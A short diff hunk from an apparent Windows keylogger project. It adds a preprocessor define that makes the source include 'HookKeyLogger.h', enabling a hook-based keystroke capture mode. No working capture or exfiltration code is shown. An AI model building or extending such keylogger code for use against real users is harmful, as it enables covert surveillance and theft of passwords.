@@ -3,6 +3,7 @@
 #include <Windows.h>
 #include "CharacterHandler.h"
 
+#define USE_HOOK
 #ifdef USE_HOOK
 #include "HookKeyLogger.h"
 #else
